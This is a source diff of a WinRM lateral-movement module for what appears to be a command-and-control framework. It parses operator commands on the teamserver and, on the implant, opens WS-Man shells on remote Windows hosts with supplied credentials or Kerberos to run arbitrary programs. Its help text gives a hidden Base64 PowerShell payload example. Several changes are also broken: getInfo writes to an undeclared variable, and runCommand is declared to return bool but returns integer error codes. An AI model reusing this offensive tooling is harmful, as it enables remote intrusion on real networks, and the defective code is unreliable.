@@ -12,7 +12,7 @@
 
 using namespace std;
 
-constexpr std::string_view moduleNameWinRM = "winrm";
+constexpr std::string_view moduleNameWinRM = "winRm";
 constexpr unsigned long long moduleHashWinRM = djb2(moduleNameWinRM);
 
 #ifdef _WIN32
@@ -42,147 +42,117 @@ std::string WinRM::getInfo()
 {
     std::ostringstream oss;
 #ifdef BUILD_TEAMSERVER
-    oss << "WinRM Client API Module:\n";
-    oss << "Execute commands remotely over WS-Man using the native WinRM client API." << '\n';
-    oss << "Options:" << '\n';
-    oss << "  -e <endpoint>        Remote host or URL (host defaults to http://<host>:5985/wsman)." << '\n';
-    oss << "  -c <command>         Command to execute." << '\n';
-    oss << "  -a <arguments>       Arguments passed to the command." << '\n';
-    oss << "  -u <user>            DOMAIN\\user credentials." << '\n';
-    oss << "  -p <password>        Password for the credential." << '\n';
-    oss << "  --https              Use HTTPS (port 5986)." << '\n';
-    oss << "Example:" << '\n';
-    oss << "  winrm -e dc01.contoso.local -c cmd.exe -a \"/c whoami\"" << '\n';
+    info += "WinRM Module:\n";
+    info += "Execute a command remotely over WS-Man using the native WinRM client API.\n";
+    info += "Administrator privileges on the remote machine are required.\n";
+    info += "Supports no credential, credential-based and Kerberos authentication (endpointWide must be FQDN).\n";
+    info += "\nUsage examples:\n";
+    info += " - winRm -u DOMAIN\\Username Password https://target:5986/wsman powershell.exe -nop -w hidden -e <Base64Payload> \n";
+    info += " - winRm -k http://target.example.com:5985/wsman whoami.exe /all \n";
+    info += " - winRm -n http://target:5985/wsman dir c:\\ \n";
+    info += "\nOptions:\n";
+    info += " -u <user> <password> <target>  Use username and password authentication\n";
+    info += " -k <targetFQDN>                Use Kerberos authentication\n";
+    info += " -n <target>                    No cred provided\n";
+    info += "\nNote:\n";
+    info += " The command and arguments following the target are passed to the remote process.\n";
 #endif
     return oss.str();
 }
 
-std::string WinRM::packParameters(const Parameters& params) const
-{
-    std::string packed;
-    auto append = [&packed](const std::string& value)
-    {
-        packed.append(value);
-        packed.push_back('\0');
-    };
-
-    append(params.endpoint);
-    append(params.command);
-    append(params.arguments);
-    append(params.username);
-    append(params.password);
-    append(params.useHttps ? "1" : "0");
-    return packed;
-}
-
-WinRM::Parameters WinRM::unpackParameters(const std::string& data) const
-{
-    Parameters params;
-    std::vector<std::string> parts;
-    size_t start = 0;
-    while (start < data.size())
-    {
-        size_t end = data.find('\0', start);
-        if (end == std::string::npos)
-        {
-            break;
-        }
-        parts.emplace_back(data.substr(start, end - start));
-        start = end + 1;
-    }
-
-    if (parts.size() < 6)
-    {
-        return params;
-    }
-
-    params.endpoint = parts[0];
-    params.command = parts[1];
-    params.arguments = parts[2];
-    params.username = parts[3];
-    params.password = parts[4];
-    params.useHttps = parts[5] == "1";
-    return params;
-}
 
 int WinRM::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
 {
-#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
-    std::vector<std::string> args = regroupStrings(splitedCmd);
-    Parameters params;
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
+    if (splitedCmd.size() >= 2)
+    {
+        string mode = splitedCmd[1];
 
-    if (args.size() < 2)
+        if(mode=="-u" && splitedCmd.size() >= 5)
+        {
+            string usernameDomain=splitedCmd[2];
+            string password=splitedCmd[3];
+            string target=splitedCmd[4];
+            std::string username="";
+            std::string domain=".";
+
+            std::vector<std::string> splitedList;
+            splitList(usernameDomain, "\\", splitedList);
+
+            if(splitedList.size()==1)
+                username = splitedList[0];
+            else if(splitedList.size()>1)
+            {
+                domain = splitedList[0];
+                username = splitedList[1];
+            }
+
+            std::string cmd = domain;
+            cmd += '\0';
+            cmd += username;
+            cmd += '\0';
+            cmd += password;
+            cmd += '\0';
+            cmd += target;
+
+            c2Message.set_cmd(cmd);
+
+            std::string programToLaunch="";
+            for (int idx = 5; idx < splitedCmd.size(); idx++) 
+            {
+                if(!programToLaunch.empty())
+                    programToLaunch+=" ";
+                programToLaunch+=splitedCmd[idx];
+            }
+
+            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
+        }
+        else if((mode=="-n" || mode=="-k") && splitedCmd.size() >= 3)
+        {
+            string target=splitedCmd[2];
+
+            std::string cmd = "";
+            cmd += target;
+
+            c2Message.set_cmd(cmd);
+
+            std::string programToLaunch="";
+            for (int idx = 3; idx < splitedCmd.size(); idx++) 
+            {
+                if(!programToLaunch.empty())
+                    programToLaunch+=" ";
+                programToLaunch+=splitedCmd[idx];
+            }
+
+            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
+        }
+        else
+        {
+            c2Message.set_returnvalue(getInfo());
+            return -1;
+        }
+
+        c2Message.set_instruction(splitedCmd[0]);
+    }
+    else
     {
         c2Message.set_returnvalue(getInfo());
         return -1;
     }
 
-    for (size_t i = 1; i < args.size(); ++i)
-    {
-        const std::string& current = args[i];
-        if (current == "-e" && i + 1 < args.size())
-        {
-            params.endpoint = args[++i];
-        }
-        else if (current == "-c" && i + 1 < args.size())
-        {
-            params.command = args[++i];
-        }
-        else if (current == "-a" && i + 1 < args.size())
-        {
-            params.arguments = args[++i];
-        }
-        else if (current == "-u" && i + 1 < args.size())
-        {
-            params.username = args[++i];
-        }
-        else if (current == "-p" && i + 1 < args.size())
-        {
-            params.password = args[++i];
-        }
-        else if (current == "--https")
-        {
-            params.useHttps = true;
-        }
-        else if (!current.empty() && current[0] != '-')
-        {
-            if (params.endpoint.empty())
-            {
-                params.endpoint = current;
-            }
-            else if (params.command.empty())
-            {
-                params.command = current;
-            }
-            else if (params.arguments.empty())
-            {
-                params.arguments = current;
-            }
-        }
-    }
 
-    if (params.endpoint.empty() || params.command.empty())
-    {
-        c2Message.set_returnvalue("Missing endpoint or command.\n" + getInfo());
-        return -1;
-    }
-
-    c2Message.set_instruction(splitedCmd[0]);
-    c2Message.set_cmd(packParameters(params));
 #endif
     return 0;
 }
 
 int WinRM::process(C2Message& c2Message, C2Message& c2RetMessage)
 {
-    Parameters params = unpackParameters(c2Message.cmd());
     std::string result;
 
 #ifdef _WIN32
-    result = runCommand(params);
+    bool error = runCommand(c2Message, result);
 #else
-    (void)params;
-    result = "WinRM module is only supported on Windows.\n";
+    result = "Only supported on Windows.\n";
 #endif
 
     c2RetMessage.set_instruction(c2Message.instruction());
@@ -191,15 +161,38 @@ int WinRM::process(C2Message& c2Message, C2Message& c2RetMessage)
     return 0;
 }
 
+
+#define ERROR_CONFIG 1 
+#define ERROR_WSMAN_INIT 2
+#define ERROR_WSMAN_CREATE_SESSION 3
+#define ERROR_WSMAN_CREATE_EVENT 4
+#define ERROR_WSMAN_CREATE_SHELL 5
+#define ERROR_WSMAN_RUN_SHELL_COMMAND 6
+
+
 int WinRM::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
 {
-    errorMsg = c2RetMessage.returnvalue();
+#ifdef BUILD_TEAMSERVER
+    int errorCode = c2RetMessage.errorCode();
+    if(errorCode>0)
+    {
+        if(errorCode==ERROR_CONFIG)
+            errorMsg = "Failed with input data.";
+        else if(errorCode==ERROR_WSMAN_CREATE_EVENT)
+            errorMsg = "Failed to create synchronization event for WinRM output.";
+        else
+            errorMsg = c2RetMessage.returnvalue();
+    }
+#endif
     return 0;
 }
 
+
 #ifdef _WIN32
+
 namespace
 {
+
     std::wstring widen(const std::string& value)
     {
         if (value.empty())
@@ -217,6 +210,7 @@ namespace
         MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), buffer.data(), required);
         return buffer;
     }
+
 
     std::string narrow(const std::wstring& value)
     {
@@ -236,10 +230,11 @@ namespace
         return buffer;
     }
 
+
     std::string formatWin32Error(DWORD errorCode, PCWSTR detail)
     {
         std::ostringstream oss;
-        oss << "WinRM API error 0x" << std::hex << std::uppercase << errorCode;
+        oss << "Err 0x" << std::hex << std::uppercase << errorCode;
         oss << std::nouppercase << std::dec;
 
         if (detail != nullptr)
@@ -267,19 +262,6 @@ namespace
         return oss.str();
     }
 
-    std::string buildEndpoint(const WinRM::Parameters& params)
-    {
-        if (params.endpoint.rfind("http://", 0) == 0 || params.endpoint.rfind("https://", 0) == 0)
-        {
-            return params.endpoint;
-        }
-
-        std::ostringstream oss;
-        oss << (params.useHttps ? "https://" : "http://");
-        oss << params.endpoint;
-        oss << (params.useHttps ? ":5986/wsman" : ":5985/wsman");
-        return oss.str();
-    }
 
     struct ShellContext
     {
@@ -288,6 +270,7 @@ namespace
         std::string message;
     };
 
+
     struct CommandContext
     {
         HANDLE eventHandle = nullptr;
@@ -295,6 +278,7 @@ namespace
         std::string message;
         WSMAN_COMMAND_HANDLE commandHandle = nullptr;
     };
+
 
     struct ReceiveContext
     {
@@ -306,6 +290,7 @@ namespace
         bool completed = false;
     };
 
+    
     void CALLBACK ShellCallback(PVOID context,
                                  DWORD flags,
                                  WSMAN_ERROR* error,
@@ -337,6 +322,7 @@ namespace
             SetEvent(shellContext->eventHandle);
         }
     }
+
 
     void CALLBACK CommandCallback(PVOID context,
                                    DWORD flags,
@@ -373,12 +359,13 @@ namespace
         }
     }
 
+
     void CALLBACK ReceiveCallback(PVOID context,
                                    DWORD flags,
                                    WSMAN_ERROR* error,
                                    WSMAN_SHELL_HANDLE /*shell*/,
                                    WSMAN_COMMAND_HANDLE /*command*/,
-                                   WSMAN_OPERATION_HANDLE operationHandle,
+                                   WSMAN_OPERATION_HANDLE /*operationHandle*/,
                                    WSMAN_RESPONSE_DATA* data)
     {
         auto* receiveContext = static_cast<ReceiveContext*>(context);
@@ -396,17 +383,23 @@ namespace
         if (data != nullptr)
         {
             const WSMAN_RECEIVE_DATA_RESULT& receiveData = data->receiveData;
+
             if (receiveData.streamData.type == WSMAN_DATA_TYPE_TEXT &&
                 receiveData.streamData.text.buffer != nullptr &&
                 receiveData.streamData.text.bufferLength > 0)
             {
-                std::wstring segment(receiveData.streamData.text.buffer,
-                                     receiveData.streamData.text.buffer + receiveData.streamData.text.bufferLength);
+                std::wstring segment(receiveData.streamData.text.buffer, receiveData.streamData.text.buffer + receiveData.streamData.text.bufferLength);
                 receiveContext->output.append(narrow(segment));
             }
+            else if (receiveData.streamData.type== WSMAN_DATA_TYPE_BINARY && receiveData.streamData.binaryData.data && receiveData.streamData.binaryData.dataLength > 0)
+            {
+                const char* buf = reinterpret_cast<const char*>(receiveData.streamData.binaryData.data);
+                size_t len = receiveData.streamData.binaryData.dataLength;
 
-            if (receiveData.commandState != nullptr &&
-                _wcsicmp(receiveData.commandState, WSMAN_COMMAND_STATE_DONE) == 0)
+                receiveContext->output.append(buf, buf + len);
+            }
+
+            if (receiveData.commandState != nullptr && _wcsicmp(receiveData.commandState, WSMAN_COMMAND_STATE_DONE) == 0)
             {
                 receiveContext->completed = true;
                 receiveContext->exitCode = receiveData.exitCode;
@@ -418,48 +411,82 @@ namespace
             receiveContext->completed = true;
         }
 
-        if (operationHandle != nullptr)
-        {
-            WSManCloseOperation(operationHandle, 0);
-        }
-
         if (receiveContext->eventHandle != nullptr)
         {
             SetEvent(receiveContext->eventHandle);
         }
     }
+
 }
 
-std::string WinRM::runCommand(const Parameters& params) const
-{
-    std::string endpoint = buildEndpoint(params);
-    // TODO fix
-    endpoint="http://localhost:5985/wsman";
-    std::wstring endpointWide = widen(endpoint);
 
-    std::wstring commandLineWide = widen(params.command);
-    if (!params.arguments.empty())
+bool WinRM::runCommand(const C2Message& c2Message, std::string& result) const
+{
+    std::string cmd = c2Message.cmd();
+
+    std::vector<std::string> splitedList;
+    std::string delimitator;
+    delimitator+='\0';
+    splitList(cmd, delimitator, splitedList);
+    
+    bool useToken=false;
+    std::string authority="";
+
+    bool usePassword=false;
+    std::string target="";
+    std::string domainName="";
+    std::string username="";
+    std::string user="";
+    std::string password="";
+
+    if(splitedList.size()==4)
     {
-        commandLineWide += L" ";
-        commandLineWide += widen(params.arguments);
+        usePassword=true;
+
+        domainName=splitedList[0];
+        username=splitedList[1];
+        password=splitedList[2];
+        target=splitedList[3];
+
+        user=domainName;
+        user+="\\";
+        user+=username;
+
     }
+    else if(splitedList.size()==1)
+    {
+        usePassword=false;
+
+        target=splitedList[0];
+    }
+    else
+    {
+        result = "";
+        return ERROR_CONFIG;
+    }
+
+    const std::string data = c2Message.data();
+
+    std::wstring endpointWide = widen(target);
+    std::wstring commandLineWide = widen(data);
 
     WSMAN_API_HANDLE apiHandle = nullptr;
     DWORD status = WSManInitialize(0, &apiHandle);
 
     if (status != ERROR_SUCCESS)
     {
-        return formatWin32Error(status, nullptr);
+        result = formatWin32Error(status, nullptr);
+        return ERROR_WSMAN_INIT;
     }
 
     WSMAN_AUTHENTICATION_CREDENTIALS credentials{};
     WSMAN_AUTHENTICATION_CREDENTIALS* credentialsPtr = nullptr;
     std::wstring usernameWide;
     std::wstring passwordWide;
-    if (!params.username.empty())
+    if (usePassword)
     {
-        usernameWide = widen(params.username);
-        passwordWide = widen(params.password);
+        usernameWide = widen(username);
+        passwordWide = widen(password);
         credentials.authenticationMechanism = WSMAN_FLAG_AUTH_NEGOTIATE;
         credentials.userAccount.username = usernameWide.c_str();
         credentials.userAccount.password = passwordWide.c_str();
@@ -476,7 +503,8 @@ std::string WinRM::runCommand(const Parameters& params) const
     if (status != ERROR_SUCCESS)
     {
         WSManDeinitialize(apiHandle, 0);
-        return formatWin32Error(status, nullptr);
+        result = formatWin32Error(status, nullptr);
+        return ERROR_WSMAN_CREATE_SESSION;
     }
 
     ShellContext shellContext;
@@ -485,7 +513,9 @@ std::string WinRM::runCommand(const Parameters& params) const
     {
         WSManCloseSession(session, 0);
         WSManDeinitialize(apiHandle, 0);
-        return "Failed to create synchronization event for WinRM shell.\n";
+
+        result = "";
+        return ERROR_WSMAN_CREATE_EVENT;
     }
 
     WSMAN_SHELL_ASYNC shellAsync{};
@@ -511,7 +541,9 @@ std::string WinRM::runCommand(const Parameters& params) const
         CloseHandle(shellContext.eventHandle);
         WSManCloseSession(session, 0);
         WSManDeinitialize(apiHandle, 0);
-        return message;
+
+        result =  message;
+        return ERROR_WSMAN_CREATE_SHELL;
     }
 
     CommandContext commandContext;
@@ -522,15 +554,14 @@ std::string WinRM::runCommand(const Parameters& params) const
         CloseHandle(shellContext.eventHandle);
         WSManCloseSession(session, 0);
         WSManDeinitialize(apiHandle, 0);
-        return "Failed to create synchronization event for WinRM command.\n";
+
+        result = "";
+        return ERROR_WSMAN_CREATE_EVENT;
     }
 
     WSMAN_SHELL_ASYNC commandAsync{};
     commandAsync.operationContext = &commandContext;
     commandAsync.completionFunction = CommandCallback;
-
-    // TODO FIx
-    commandLineWide = L"cmd /c echo ran > C:\\Users\\max\\Desktop\\winrm_test.txt";
 
     WSManRunShellCommand(shellHandle,
                          0,
@@ -555,7 +586,9 @@ std::string WinRM::runCommand(const Parameters& params) const
         CloseHandle(shellContext.eventHandle);
         WSManCloseSession(session, 0);
         WSManDeinitialize(apiHandle, 0);
-        return message;
+
+        result =  message;
+        return ERROR_WSMAN_RUN_SHELL_COMMAND;
     }
 
     ReceiveContext receiveContext;
@@ -568,7 +601,9 @@ std::string WinRM::runCommand(const Parameters& params) const
         CloseHandle(shellContext.eventHandle);
         WSManCloseSession(session, 0);
         WSManDeinitialize(apiHandle, 0);
-        return "Failed to create synchronization event for WinRM output.\n";
+
+        result = "";
+        return ERROR_WSMAN_CREATE_EVENT;
     }
 
     WSMAN_SHELL_ASYNC receiveAsync{};
@@ -594,6 +629,9 @@ std::string WinRM::runCommand(const Parameters& params) const
 
         WaitForSingleObject(receiveContext.eventHandle, INFINITE);
 
+        if(receiveOp != nullptr)
+            WSManCloseOperation(receiveOp, 0);
+
         if (receiveContext.errorCode != ERROR_SUCCESS)
         {
             break;
@@ -611,11 +649,11 @@ std::string WinRM::runCommand(const Parameters& params) const
         response = receiveContext.output;
         if (response.empty())
         {
-            response = "Command executed with no output.\n";
+            response = "No output.\n";
         }
 
         std::ostringstream trailer;
-        trailer << "\n[ExitCode] " << receiveContext.exitCode << "\n";
+        trailer << "\n[Code] " << receiveContext.exitCode << "\n";
         response.append(trailer.str());
     }
 
@@ -632,6 +670,7 @@ std::string WinRM::runCommand(const Parameters& params) const
     WSManCloseSession(session, 0);
     WSManDeinitialize(apiHandle, 0);
 
-    return response;
+    result =  response;
+    return 0;
 }
 #endif
